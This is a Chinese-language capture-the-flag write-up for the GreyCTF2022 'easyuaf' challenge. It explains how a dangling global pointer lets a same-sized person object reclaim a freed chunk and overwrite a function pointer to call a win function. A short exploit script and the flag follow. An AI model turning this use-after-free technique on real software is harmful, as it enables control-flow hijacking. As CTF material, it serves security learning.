# GreyCTF2022 - easyuaf

## 题目简述

程序释放组织对象后没有清空全局指针，随后又允许分配大小相同的个人对象。分配器会复用刚释放的堆块，个人信息中的整数因此覆盖组织对象中的函数指针，形成 use-after-free。

## 解题过程

先创建组织对象并记录其仍可从菜单访问，再执行删除。此时指针悬空，但对应 chunk 已进入空闲链表。创建尺寸相同的 person，glibc 通常把该 chunk 原址返回；根据两个结构体的字段偏移，person 的 `personal_num` 正好落在旧组织对象回调位置。

```python
elf = ELF('./easyuaf', checksec=False)
win = elf.sym['ezflag']

create_org(...)
delete_org()                 # 全局 org 指针未置空
create_person(name=b'A'*8, personal_num=win)
trigger_org_callback()       # 经悬空指针调用 ezflag
```

触发旧对象的方法时，程序把被覆盖值当作函数地址调用，得到：

```text
grey{u_are_feeling_good?}
```

## 方法总结

UAF 的利用条件是“生命周期错误”与“可控重占位”同时成立。分析时要比较旧、新对象的实际分配尺寸和字段偏移，而不只是源码类型；若 tcache、对齐或额外分配改变复用顺序，需先通过调试确认 chunk 是否真的回到原地址。
